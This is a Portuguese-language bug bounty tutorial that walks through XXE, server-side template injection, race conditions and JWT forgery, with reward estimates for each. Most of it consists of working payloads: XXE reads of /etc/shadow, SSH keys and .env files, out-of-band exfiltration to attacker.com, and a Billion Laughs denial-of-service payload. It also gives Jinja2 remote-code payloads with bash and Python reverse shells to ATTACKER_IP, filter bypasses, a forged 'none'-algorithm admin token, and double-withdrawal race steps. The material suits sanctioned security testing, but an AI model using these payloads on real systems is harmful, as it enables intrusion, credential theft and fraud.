# 🔥 TÉCNICAS AVANÇADAS - XXE, SSTI, Race Conditions, JWT

Vulnerabilidades complexas que pagam muito ($1K-50K+)

---

# XXE - XML External Entity

## O QUE É?

```
XML que referencia entidades externas:

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

= Ler arquivos do servidor!
```

**CVSS:** 9.0 | **Recompensa:** $2,000-$10,000+ | **Tempo:** 1-4h

---

## EXPLORAÇÃO PASSO-A-PASSO

### PASSO 1: Identificar XML Endpoint

```
Procure em Burp por:
- Content-Type: application/xml
- Requests com <tag>data</tag>
- Upload de arquivo .xml
- API endpoints que aceitam XML

Exemplo:
POST /api/upload HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<file>
  <name>test.txt</name>
</file>
```

### PASSO 2: Testar XXE Básico

```
Enviar para Repeater

Teste 1: Definir entidade
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY test "value">
]>
<file>
  <name>&test;</name>
</file>
[Send]

Se retornar "value" = XXE funciona!
```

### PASSO 3: Explorar - Ler Arquivo

```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<file>
  <name>&xxe;</name>
</file>

Resultado:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### PASSO 4: Ler Arquivo Sensível

```
Testar arquivos comuns:

/etc/passwd          ← usuários do sistema
/etc/shadow          ← senhas (se tem privilégio)
/etc/hosts           ← configurações de rede
/var/log/apache2/access.log  ← logs
/root/.ssh/id_rsa    ← SSH key (crítico!)
/home/user/.ssh/authorized_keys
/app/config/database.php  ← credenciais de banco
/app/config/.env     ← secrets
```

### PASSO 5: XXE Blind (Sem resposta visível)

Se aplicação não retorna conteúdo, usar Out-of-Band:

```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/exfil.php?data=file">
]>
<file>
  <name>&xxe;</name>
</file>

= Servidor vai fazer requisição para seu servidor
= Você vê os dados nos logs!

Usar: Collaborator (Burp Professional)
```

---

## PAYLOADS XXE

```
Leitura de arquivo:
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

Leitura de arquivo remoto:
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">
]>

Billion Laughs (DoS):
<!DOCTYPE foo [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<foo>&lol3;</foo>

= Trava servidor com entidades aninhadas!

Parameter Entity:
<!DOCTYPE foo [
  <!ENTITY % pe SYSTEM "http://attacker.com/evil.dtd">
  %pe;
]>
```

---

# SSTI - Server-Side Template Injection

## O QUE É?

```
Injetar código em templates:

Flask/Jinja2:
{{ 7 * 7 }} = 49 em resposta

Significa código template executado no servidor!
```

**CVSS:** 9.0 | **Recompensa:** $2,000-$15,000+ | **Tempo:** 2-6h

---

## EXPLORAÇÃO PASSO-A-PASSO

### PASSO 1: Identificar Template Engine

```
Teste com Burp Repeater:

POST /message HTTP/1.1
message={{ 7 * 7 }}

Respostas por engine:

Flask/Jinja2:
"Message: 49" ← SSTI presente!

Django:
"Message: {{ 7 * 7 }}" ← Sem SSTI (escapado)

Twig:
"Message: 49" ← SSTI presente!

Velocity:
"Message: 49" ← SSTI presente!
```

### PASSO 2: Testar Acesso ao Objeto

```
Flask/Jinja2:
{{ config }}
{{ self }}
{{ ''.__class__ }}

Resultado:
<Config 'flask.config.Config' object>
= Pode manipular config!
```

### PASSO 3: RCE (Remote Code Execution)

```
Payload para ler arquivo:
{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd', shell=True, stdout=-1).communicate() }}

Resultado:
(b'root:x:0:0:root:/root:/bin/bash\n...', None)
= Arquivo lido!

Payload para RCE simples:
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}

Resultado:
www-data
= Comando executado!
```

### PASSO 4: Criar Reverse Shell

```
Payload:
{{ config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"').read() }}

= Conexão reverse shell!

Ou usar Python:
{{ config.__class__.__init__.__globals__['os'].popen('python -c "import socket,subprocess;s=socket.socket();s.connect((\'ATTACKER_IP\',PORT));subprocess.call([\'/bin/sh\',\'-i\'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"').read() }}
```

---

## PAYLOADS SSTI

```
Teste básico (reconhecimento):
{{ 7 * 7 }}
{{ config }}
{{ self }}
${7*7}
<%= 7*7 %>

Acesso a objeto:
{{ ''.__class__ }}
{{ request.application }}
{{ config.SECRET_KEY }}

RCE:
{{ ''.__class__.__mro__[1].__subclasses__()[396]('ls',shell=True, stdout=-1).communicate() }}
${@java.lang.Runtime@getRuntime().exec('command')}
<%= system('command') %>

Bypass de filtro:
{{ "".format(__import__('os').popen('command').read()) }}
{{ config | attr('__class__') }}
{{ ().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read() }}
```

---

# Race Conditions

## O QUE É?

```
Explorar o timing entre operações:

Exemplo banco:
1. Verifica saldo: $100
2. Deduz $50
3. Deduz $60 (simultaneamente)
Result: $100 - $50 - $60 = -$10 ❌

Attacker pode:
- Sacar mais do que tem
- Usar desconto múltiplas vezes
- Bypassar limite
```

**CVSS:** 7.5 | **Recompensa:** $5,000-$50,000+ | **Tempo:** 2-6h

---

## EXPLORAÇÃO COM BURP

### PASSO 1: Identificar Operação Sensível

```
Procure por:
- Transferência de dinheiro
- Aplicar cupom desconto
- Mudança de status
- Ação irreversível

Exemplo: POST /apply-coupon
coupon_id=SAVE50
```

### PASSO 2: Teste de Timing

```
Burp Repeater:

Requisição 1:
POST /apply-coupon HTTP/1.1
coupon_id=SAVE50

[Send 10x em sequência rápida]

Resultado:
1º: Desconto de 50% aplicado ✅
2º: "Coupon already used"
3º: "Coupon already used"
...

Se conseguir aplicar 2x = Race Condition!
```

### PASSO 3: Usar Burp Intruder para Sincronizar

```
Objetivo: Enviar 10 requisições EXATAMENTE ao mesmo tempo

Intruder:
1. Marcar posição: POST /apply-coupon?payload=§1§
2. Payloads: 1, 2, 3, 4, 5, 6, 7, 8, 9, 10
3. Options:
   ☐ Uncheck "Process cookies"
   ☐ Request engine threads: 10 (máximo)
4. [Start Attack]

Analisar resultados:
- Múltiplos status 200 = Race condition!
- Mix de 200 e erro = Race timing explorado!
```

### PASSO 4: Exploração Real

```
Cenário: Saque bancário com verificação de saldo

Normal:
GET /balance → Saldo: $100
POST /withdraw?amount=100 → Sucesso
Saldo final: $0

Race Condition:
Enviar 2x simultaneamente:
POST /withdraw?amount=100
POST /withdraw?amount=100

Banco verifica saldo 1x ($100)
Aprova ambas (race condition)
Resultado: Sacou $200 com $100!
```

---

# JWT - JSON Web Token Exploitation

## O QUE É?

```
JWT = header.payload.signature

Exemplo decodificado:
Header: {"alg":"HS256","typ":"JWT"}
Payload: {"user_id":123,"is_admin":false}
Signature: HMACSHA256(header.payload, secret)
```

**Vulnerabilidades:** Fraco, None algorithm, bypass de assinatura

**CVSS:** 8.0 | **Recompensa:** $1,000-$5,000 | **Tempo:** 1-3h

---

## EXPLORAÇÃO PASSO-A-PASSO

### PASSO 1: Identificar JWT

```
Procure em cookies/headers:
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Cookie: session=eyJhbGc...
```

### PASSO 2: Decodificar JWT

**Com Burp Decoder:**
```
1. Copie token
2. Clique Decoder
3. Base64 → Decode
4. Selecione header parte
5. Veja: {"alg":"HS256"}
```

**Com ferramenta online:**
```
https://jwt.io
Cole token
Vê: header, payload, signature
```

### PASSO 3: Testar Algoritmo None

```
Mudar algoritmo para "none":
Header: {"alg":"none","typ":"JWT"}
Payload: {"user_id":123,"is_admin":true}
Signature: (deixar vazio)

Novo token:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxMjMsImlzX2FkbWluIjp0cnVlfQ.

Enviar como Authorization header
Servidor aceita? = Vulnerável!
```

### PASSO 4: Quebrar Assinatura (Força Bruta)

```
Se algoritmo é HS256 com senha fraca:

Ferramenta: jwt-cracker

./jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  --dict=/path/to/wordlist.txt

Resultado se senha fraca:
secret
password
123456
admin

= Encontrou secret! Agora pode falsificar tokens!
```

### PASSO 5: Falsificar Token

```
Com secret encontrado:

1. Mude payload:
   {"user_id":123,"is_admin":true}
   → {"user_id":1,"is_admin":true}  (admin?)

2. Recalcule assinatura:
   HMACSHA256(header.payload, "secret")

3. Novo token: envie como cookie/header

4. Você agora é admin!
```

---

## PAYLOADS JWT

```
Algoritmo None:
{"alg":"none","typ":"JWT"}

Algoritmo HS256 (weak secret):
Use: "password", "secret", "key", "12345", "admin"

RSA key confusion:
Se server usa RS256 (assimétrico)
Tente trocar para HS256 (simétrico)
Use public key como secret

Claim manipulation:
{"user_id":1,"is_admin":true,"role":"admin"}
{"exp": 9999999999} (token nunca expira)

Payload encoding bypass:
Use diferentes espaços em branco
Dupla codificação
Null bytes
```

---

## RESUME TÉCNICAS AVANÇADAS

| Técnica | CVSS | Recompensa | Tempo | Dificuldade |
|---------|------|-----------|-------|-------------|
| XXE | 9.0 | $2K-10K | 1-4h | Médio |
| SSTI | 9.0 | $2K-15K | 2-6h | Difícil |
| Race Condition | 7.5 | $5K-50K | 2-6h | Muito Difícil |
| JWT Bypass | 8.0 | $1K-5K | 1-3h | Médio |

---

**Próximo:** Volte para [BUG-BOUNTY-MASTER-README](./BUG-BOUNTY-MASTER-README.md)

